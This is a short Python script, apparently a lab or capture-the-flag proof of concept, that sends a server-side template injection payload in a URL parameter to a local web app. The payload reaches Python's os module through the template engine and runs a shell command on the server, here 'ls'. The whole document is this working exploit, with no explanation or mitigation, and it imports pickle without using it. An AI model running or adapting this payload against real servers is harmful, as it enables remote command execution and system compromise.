import requests
import pickle

url = 'http://localhost:5000/?name=${self.module.cache.util.os.system("ls")}'
response = requests.get(url)
print(response.text)